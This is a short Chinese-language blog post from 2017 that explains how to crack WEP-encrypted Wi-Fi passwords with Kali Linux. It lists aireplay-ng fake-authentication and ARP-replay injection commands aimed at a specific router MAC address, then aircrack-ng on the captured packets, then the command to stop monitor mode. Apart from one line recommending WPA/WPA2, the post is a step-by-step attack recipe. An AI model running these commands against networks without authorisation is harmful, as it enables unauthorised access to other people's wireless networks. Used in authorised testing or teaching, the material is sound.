---
title: "Kali Linux破解wifi密码(WEP)"
categories: [ "安全" ]
tags: [ "wifi安全" ]
draft: false
slug: "Kali Linux破解wifi密码(WEP)-kalilinux破解wifi密码wep"
date: "2017-04-08 07:14:09"
---



WEP是无线路由器最初广泛使用的一种加密方式，这种加密方式非常容易被破解。

目前很少有人使用wep加密方式，但是还是会有。

建议：使用WPA/WPA2做为加密方式。

抓包和“破解wpa/wpa2”方法一样，参考其中的前4步

## 5) 加快Beacons和Data数据的收集速度

和破解WPA/WPA2不同的是，它只要抓取到足够的Beacons和Data数据就可以破解，理想情况下是100000+。你可以等，也可以使用aireplay加快这个进程。

    # aireplay-ng -1 0 -a C8:3A:35:30:3E:C8 wlan0mon
    # aireplay-ng -3 -b C8:3A:35:30:3E:C8 wlan0mon
    

等到抓取的数据充足，Ctrl+C停止。

## 6) 开始破解：

    # aircrack-ng ~/*.cap

最后，不要忘了结束无线网卡的监控模式：

    # airmon-ng stop wlan0mon